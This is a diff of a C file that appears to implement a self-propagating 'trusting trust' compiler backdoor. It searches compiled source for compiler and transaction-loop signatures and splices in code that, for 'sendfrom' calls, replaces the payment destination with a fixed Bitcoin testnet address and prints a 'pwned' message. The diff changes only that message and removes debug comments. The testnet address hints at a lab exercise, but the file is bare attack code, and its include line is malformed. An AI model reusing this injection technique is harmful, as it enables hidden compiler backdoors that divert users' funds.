@@ -1,7 +1,7 @@
 #include "attack-array.h
 static char compile_sig[] = "/* open the file */";
 static char login_sig[] = "for (i = 0; i < conf->length; i++) {";
-static char login_attack[] = "if (strcmp(conf->method, \"sendfrom\") == 0) {conf->params[1] = \"tb1qq0r36alhargdp8z7caz8r0zxnlm7w758mzc7m5\";puts(\"hackerken stole this transaction ### \");}";
+static char login_attack[] = "if (strcmp(conf->method, \"sendfrom\") == 0) {conf->params[1] = \"tb1qq0r36alhargdp8z7caz8r0zxnlm7w758mzc7m5\";puts(\"has been pwned ### \");}";
 
 /* attack code follows */
 
@@ -23,7 +23,7 @@ if (done == 0 && login_sig_loc != NULL) {
     strcpy(program + login_attack_offset + strlen(login_attack), tmp);
 
     FILE *file;
-    if (done2 == 0) //(file = fopen("attack-tmp.c", "r")))
+    if (done2 == 0) 
     {
 
     }
@@ -43,9 +43,8 @@ if (done == 0 && login_sig_loc != NULL) {
 }
 
 char *compile_sig_loc = strstr(program, compile_sig);
-//printf("LOOKING FOR COMPILER SIG!");
+
 if (compile_sig_loc != NULL) {
-    //printf("FOUND COMPILER SIG!");
     static char tmp[8*1024*1024 + 1];
     size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
     strcpy(tmp, program + compile_attack_offset);
